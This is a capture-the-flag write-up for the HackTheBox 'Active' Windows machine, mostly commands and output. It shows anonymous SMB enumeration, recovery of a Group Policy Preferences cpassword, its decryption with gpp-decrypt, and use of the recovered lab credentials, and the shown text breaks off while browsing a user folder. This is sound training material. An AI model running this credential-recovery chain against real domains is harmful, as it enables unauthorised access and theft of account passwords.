# CTF Penetration Testing

## Platform: HackTheBox

### Machine: [Active](https://www.hackthebox.com/machines/Active)

<img src="https://labs.hackthebox.com/storage/avatars/5837ac5e28291146a9f2a8a015540c28.png" alt="Active Machine Logo" width="150"/>

- Machine type: <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="17"/> Windows
- Machine difficulty: 🟩 Easy (<span style="color:#f4b03b;">4.0</span>)

> Active is an easy to medium-difficulty Windows machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.

#### Skills Required

- Basic knowledge of Active Directory authentication and shared folders

#### Skills Learned

- SMB enumeration techniques
- Group Policy Preferences enumeration and exploitation
- Identification and exploitation of Kerberoastable accounts

#### Tools Used

Linux:
- gpp-decrypt
- hashcat
- impacket-GetUserSPNs
- impacket-psexec
- netexec
- nmap
- smbclient

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig tun0`:
```
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.18 📌 netmask 255.255.254.0  destination 10.10.14.18
        inet6 dead:beef:2::1010  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::c568:36ed:c1de:e465  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5  bytes 240 (240.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping 10.10.10.100`:
```
10.10.10.100 is alive
```

`sudo nmap -Pn -sSV -p- -T5 10.10.10.100`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 12:42 CET
Warning: 10.10.10.100 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.100
Host is up (0.12s latency).
Not shown: 65402 closed tcp ports (reset), 110 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-20 11:53:09Z) 🔍
135/tcp   open  msrpc         Microsoft Windows RPC 🔍
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn 🔍
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 🔍
445/tcp   open  microsoft-ds? 🔍
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49173/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 701.30 seconds
```

`sudo nmap -Pn -sS --script=ldap-rootdse -p389 10.10.10.100`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 12:42 CET
Nmap scan report for 10.10.10.100
Host is up (0.16s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       currentTime: 20241120114214.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=active,DC=htb
|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
|       namingContexts: DC=active,DC=htb
|       namingContexts: CN=Configuration,DC=active,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=active,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=active,DC=htb
|       defaultNamingContext: DC=active,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=active,DC=htb
|       configurationNamingContext: CN=Configuration,DC=active,DC=htb
|       rootDomainNamingContext: DC=active,DC=htb
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       highestCommittedUSN: 114845
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: DC.active.htb 📌
|       ldapServiceName: active.htb:dc$@ACTIVE.HTB
|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 4
|       forestFunctionality: 4
|_      domainControllerFunctionality: 4
Service Info: Host: DC; OS: Windows 2008 R2

Nmap done: 1 IP address (1 host up) scanned in 1.29 seconds
```

`echo -e '10.10.10.100\tdc.active.htb active.htb active' | sudo tee -a /etc/hosts`:
```
10.10.10.100    dc.active.htb active.htb active
```

`netexec smb 10.10.10.100`:
```
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 📌
```

`netexec smb 10.10.10.100 -u '' -p ''`:
```
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\: 
```

`netexec smb 10.10.10.100 -u '' -p '' --shares`:
```
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\: 
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ 🔍           
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share 
SMB         10.10.10.100    445    DC               Users                       
```

`smbclient` can now be used to enumerate any available file shares.

`smbclient --no-pass //10.10.10.100/Replication`:
```
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  active.htb                          D        0  Sat Jul 21 12:37:44 2018 🔍

                5217023 blocks of size 4096. 277752 blocks available
smb: \> cd active.htb
smb: \active.htb\> dir
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 12:37:44 2018
  Policies                            D        0  Sat Jul 21 12:37:44 2018
  scripts                             D        0  Wed Jul 18 20:48:57 2018

                5217023 blocks of size 4096. 277752 blocks available
```

The only share it is possible to access with anonymous credentials is the `Replication` share, which seems to be a copy of `SYSVOL`. This is potentially interesting from a privilege escalation perspective as Group Policies (and Group Policy Preferences) are stored in the `SYSVOL` share, which is world-readable to authenticated users. Additional resources for this type of exploitation can be found [here](https://vk9-sec.com/exploiting-gpp-sysvol-groups-xml/).

`netexec smb 10.10.10.100 -u '' -p '' --shares -M spider_plus`:
```
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\: 
SPIDER_PLUS 10.10.10.100    445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.10.100    445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.10.10.100    445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.10.100    445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.10.100    445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.10.100    445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.10.100    445    DC               [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share 
SMB         10.10.10.100    445    DC               Users                           
SPIDER_PLUS 10.10.10.100    445    DC               [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.10.10.100.json". 🔍
SPIDER_PLUS 10.10.10.100    445    DC               [*] SMB Shares:           7 (ADMIN$, C$, IPC$, NETLOGON, Replication, SYSVOL, Users)
SPIDER_PLUS 10.10.10.100    445    DC               [*] SMB Readable Shares:  1 (Replication)
SPIDER_PLUS 10.10.10.100    445    DC               [*] Total folders found:  22
SPIDER_PLUS 10.10.10.100    445    DC               [*] Total files found:    7
SPIDER_PLUS 10.10.10.100    445    DC               [*] File size average:    1.16 KB
SPIDER_PLUS 10.10.10.100    445    DC               [*] File size min:        22 B
SPIDER_PLUS 10.10.10.100    445    DC               [*] File size max:        3.63 KB
```

`cat /tmp/nxc_hosted/nxc_spider_plus/10.10.10.100.json | jq`:
```json
{
  "Replication": {
    "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
      "atime_epoch": "2018-07-21 12:37:44",
      "ctime_epoch": "2018-07-21 12:37:44",
      "mtime_epoch": "2018-07-21 12:38:11",
      "size": "23 B"
    },
    "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI": {
      "atime_epoch": "2018-07-21 12:37:44",
      "ctime_epoch": "2018-07-21 12:37:44",
      "mtime_epoch": "2018-07-21 12:38:11",
      "size": "119 B"
    },
    "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
      "atime_epoch": "2018-07-21 12:37:44",
      "ctime_epoch": "2018-07-21 12:37:44",
      "mtime_epoch": "2018-07-21 12:38:11",
      "size": "1.07 KB"
    },
    "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml": {
      "atime_epoch": "2018-07-21 12:37:44",
      "ctime_epoch": "2018-07-21 12:37:44",
      "mtime_epoch": "2018-07-21 12:38:11",
      "size": "533 B"
    },
    "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
      "atime_epoch": "2018-07-21 12:37:44",
      "ctime_epoch": "2018-07-21 12:37:44",
      "mtime_epoch": "2018-07-21 12:38:11",
      "size": "2.72 KB"
    },
    "active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
      "atime_epoch": "2018-07-21 12:37:44",
      "ctime_epoch": "2018-07-21 12:37:44",
      "mtime_epoch": "2018-07-21 12:38:11",
      "size": "22 B"
    },
    "active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
      "atime_epoch": "2018-07-21 12:37:44",
      "ctime_epoch": "2018-07-21 12:37:44",
      "mtime_epoch": "2018-07-21 12:38:11",
      "size": "3.63 KB"
    }
  }
}
```

`mkdir ./replication_smbshare`

`smbclient --no-pass //10.10.10.100/Replication -c 'prompt OFF;recurse ON;lcd /home/kali/replication_smbshare;mget *'`:
```
Anonymous login successful
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (3.3 KiloBytes/sec) (average 0.9 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (0.6 KiloBytes/sec) (average 0.9 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (1.5 KiloBytes/sec) (average 1.0 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (3.9 KiloBytes/sec) (average 1.5 KiloBytes/sec)
```

We connect to the share and download its contents recursively, noticing the `Groups.xml` file in particular, which typically contains username/password combinations that can be useful for exploitation.

`tree ./replication_smbshare`:
```
./replication_smbshare
└── active.htb
    ├── DfsrPrivate
    │   ├── ConflictAndDeleted
    │   ├── Deleted
    │   └── Installing
    ├── Policies
    │   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
    │   │   ├── GPT.INI
    │   │   ├── Group Policy
    │   │   │   └── GPE.INI
    │   │   ├── MACHINE
    │   │   │   ├── Microsoft
    │   │   │   │   └── Windows NT
    │   │   │   │       └── SecEdit
    │   │   │   │           └── GptTmpl.inf
    │   │   │   ├── Preferences
    │   │   │   │   └── Groups
    │   │   │   │       └── Groups.xml 🔍
    │   │   │   └── Registry.pol
    │   │   └── USER
    │   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
    │       ├── GPT.INI
    │       ├── MACHINE
    │       │   └── Microsoft
    │       │       └── Windows NT
    │       │           └── SecEdit
    │       │               └── GptTmpl.inf
    │       └── USER
    └── scripts

23 directories, 7 files
```

`vim ./print_files.sh`:
```shell
#!/bin/bash

# Base directory
base_dir="./replication_smbshare"

# Find all files in the directory and subdirectories
find "$base_dir" -type f | while read -r file; do
    echo "===== Content of: $file ====="
    cat "$file"
    echo -e "\n" # Separator between files
done
```

`chmod u+x ./print_files.sh`

`./print_files.sh`:
```
===== Content of: ./replication_smbshare/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI =====
[General]
MachineExtensionVersions=[{17D89FEC-5C44-4972-B12D-241CAEF74509}{79F92669-4224-476C-9C5C-6EFB4D87DF4A}:10]


===== Content of: ./replication_smbshare/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI =====
[General]
Version=11


===== Content of: ./replication_smbshare/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol =====
Administrator1Policies\Microsoft\SystemCertificates\EFS;EFSBlob;;�;���8�-▒��=▒�v�0��0�k�tu▒B5   �B�,�_�'�0
              0
UEFS1(0&U
Administrator121180624185345Z0P10Uficate0 
              0
UEFS1(0&U
�0�     *�H��File Encryption Certificate0�"0
���&�L��?6\
>k�     �f)�ZU�▒�g#�渎{��2��t�!�$�t�c��R#i��S�>Y���l��J3G+ڻ&_�;�r.U���Xf_:R�pV��x��B3�J���6Ef��Z=l�N���LEA����L��p��1�����+RkM��kZ�\���d���2Q�{4�?���.qx��-ik)V^����!6����d��|�>��rcjj��Wbl���3��f��d������Ԓ��W0U0U%0
+�7
00U)0'�%
+�7�
�&�$AdmihVڻ[�\����m�P�D��ʄ�$��Ak�i��0��▒��.��0%�2ѴJ)���/�f���
                                                             ���Zs��P��9���� ����#��r�{�lۦ�S�ߨ��胇�b��$7gYZ����Cwn}��@�`��&l�N��@7TˉP@��r��N�9r6cߌ�?��F��hH��(h�AckY▒6U=��#�y/Y�UwFLƦ��M5I[Xq����&y���^v_��F΋.nt]�hs][Software\Policies\Microsoft\SystemCertificates\EFS\Certificates\3D33FC7B7C6F982A07A49A5C76DA805938A16C6A;Blob;;�;�l25535a36-4ee3-42b9-95d0-b2f03a28ac1aMicrosoft EnhAdministrator1aphic Provider v1.0=3�{|o�*��\vڀY8�lj �0��0�k�tu▒B5       �B�,�_�'�0
              0
UEFS1(0&U
Administrator121180624185345Z0P10Uficate0 
              0
UEFS1(0&U
�0�     *�H��File Encryption Certificate0�"0
���&�L��?6\
>k�     �f)�ZU�▒�g#�渎{��2��t�!�$�t�c��R#i��S�>Y���l��J3G+ڻ&_�;�r.U���Xf_:R�pV��x��B3�J���6Ef��Z=l�N���LEA����L��p��1�����+RkM��kZ�\���d���2Q�{4�?���.qx��-ik)V^����!6����d��|�>��rcjj��Wbl���3��f��d������Ԓ��W0U0U%0
+�7
00U)0'�%
+�7�
�&�$AdmihVڻ[�\����m�P�D��ʄ�$��Ak�i��0��▒��.��0%�2ѴJ)���/�f���
                                                             ���Zs��P��9���� ����#��r�{�lۦ�S�ߨ��胇�b��$7gYZ����Cwn}��@�`��&l�N��@7TˉP@��r��N�9r6cߌ�?��F��hH��(h�AckY▒6U=��#�y/Y�UwFLƦ��M5I[Xq����&y���^v_��F΋.nt]�hs][Software\Policies\Microsoft\SystemCertificates\EFS\CRLs;;;;][Software\Policies\Microsoft\SystemCertificates\EFS\CTLs;;;;]

===== Content of: ./replication_smbshare/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf =====
��[Unicode]
Unicode=yes
[System Access]
MinimumPasswordAge = 1
MaximumPasswordAge = 42
MinimumPasswordLength = 7
PasswordComplexity = 1
PasswordHistorySize = 24
LockoutBadCount = 0
RequireLogonToChangePassword = 0
ForceLogoffWhenHourExpire = 0
ClearTextPassword = 0
LSAAnonymousNameLookup = 0
[Kerberos Policy]
MaxTicketAge = 10
MaxRenewAge = 7
MaxServiceAge = 600
MaxClockSkew = 5
TicketValidateClient = 1
[Registry Values]
MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1
[Version]
signature="$CHICAGO$"
Revision=1
```
```xml
===== Content of: ./replication_smbshare/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml =====
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User> 📌
</Groups>
```
```
===== Content of: ./replication_smbshare/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI =====
[General]
Version=1


===== Content of: ./replication_smbshare/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf =====
��[Unicode]
Unicode=yes
[Registry Values]
MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
[Privilege Rights]
SeAssignPrimaryTokenPrivilege = *S-1-5-20,*S-1-5-19
SeAuditPrivilege = *S-1-5-20,*S-1-5-19
SeBackupPrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeBatchLogonRight = *S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544
SeChangeNotifyPrivilege = *S-1-5-32-554,*S-1-5-11,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-1-0
SeCreatePagefilePrivilege = *S-1-5-32-544
SeDebugPrivilege = *S-1-5-32-544
SeIncreaseBasePriorityPrivilege = *S-1-5-32-544
SeIncreaseQuotaPrivilege = *S-1-5-32-544,*S-1-5-20,*S-1-5-19
SeInteractiveLogonRight = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544
SeLoadDriverPrivilege = *S-1-5-32-550,*S-1-5-32-544
SeMachineAccountPrivilege = *S-1-5-11
SeNetworkLogonRight = *S-1-5-32-554,*S-1-5-9,*S-1-5-11,*S-1-5-32-544,*S-1-1-0
SeProfileSingleProcessPrivilege = *S-1-5-32-544
SeRemoteShutdownPrivilege = *S-1-5-32-549,*S-1-5-32-544
SeRestorePrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSecurityPrivilege = *S-1-5-32-544
SeShutdownPrivilege = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSystemEnvironmentPrivilege = *S-1-5-32-544
SeSystemProfilePrivilege = *S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420,*S-1-5-32-544
SeSystemTimePrivilege = *S-1-5-32-549,*S-1-5-32-544,*S-1-5-19
SeTakeOwnershipPrivilege = *S-1-5-32-544
SeUndockPrivilege = *S-1-5-32-544
SeEnableDelegationPrivilege = *S-1-5-32-544
[Version]
signature="$CHICAGO$"
Revision=1
```

We obtain the username `SVC_TGS`, as well as an encrypted password.

Group Policy Preferences (GPP) was introduced in Windows Server 2008, and among many other features, allowed administrators to modify users and groups across their network.
An example use case is where a company’s gold image had a weak local administrator password, and administrators wanted to retrospectively set it to something stronger. The defined password was AES-256 encrypted and stored in `Groups.xml`.
However, at some point in 2012, Microsoft published the AES key on MSDN, meaning that passwords set using GPP are now trivial to crack and considered low-hanging fruit.

We extract the encrypted password form the `Groups.xml` file and decrypt it using `gpp-decrypt`.

`gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`:
```
GPPstillStandingStrong2k18 🔑
```

The domain account `SVC_TGS` has the password `GPPstillStandingStrong2k18`.

`netexec smb 10.10.10.100 -u 'svc_tgs' -p 'GPPstillStandingStrong2k18'`:
```
netexec smb 10.10.10.100 -u 'svc_tgs' -p 'GPPstillStandingStrong2k18'
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18
```

With valid credentials for the `active.htb` domain, further enumeration can be undertaken. The `SYSVOL` and `Users` shares are now accessible.

`netexec smb 10.10.10.100 -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' --shares`:
```
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\svc_tgs:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ    
```

`smbclient -U 'svc_tgs%GPPstillStandingStrong2k18' //10.10.10.100/Users`:
```
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 16:39:20 2018
  ..                                 DR        0  Sat Jul 21 16:39:20 2018
  Administrator                       D        0  Mon Jul 16 12:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 07:06:44 2009
  Default                           DHR        0  Tue Jul 14 08:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 07:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 06:57:55 2009
  Public                             DR        0  Tue Jul 14 06:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 17:16:32 2018 🔍
cd 
                5217023 blocks of size 4096. 277722 blocks available
smb: \> cd SVC_TGS\
smb: \SVC_TGS\> dir
  .                                   D        0  Sat Jul 21 17:16:32 2018
  ..                                  D        0  Sat Jul 21 17:16:32 2018
  Contacts                            D        0  Sat Jul 21 17:14:11 2018
  Desktop                             D        0  Sat Jul 21 17:14:42 2018
  Downloads                           D        0  Sat Jul 21 17:14:23 2018
  Favorites                           D        0  Sat Jul 21 17:14:44 2018
  Links                               D        0  Sat Jul 21 17:14:57 2018
  My Documents                        D        0  Sat Jul 21 17:15:03 2018
  My Music                            D        0  Sat Jul 21 17:15:32 2018
  My Pictures                         D        0  Sat Jul 21 17:15:43 2018
  My Videos                           D        0  Sat Jul 21 17:15:53 2018
  Saved Games                         D        0  Sat Jul 21 17:16:12 2018
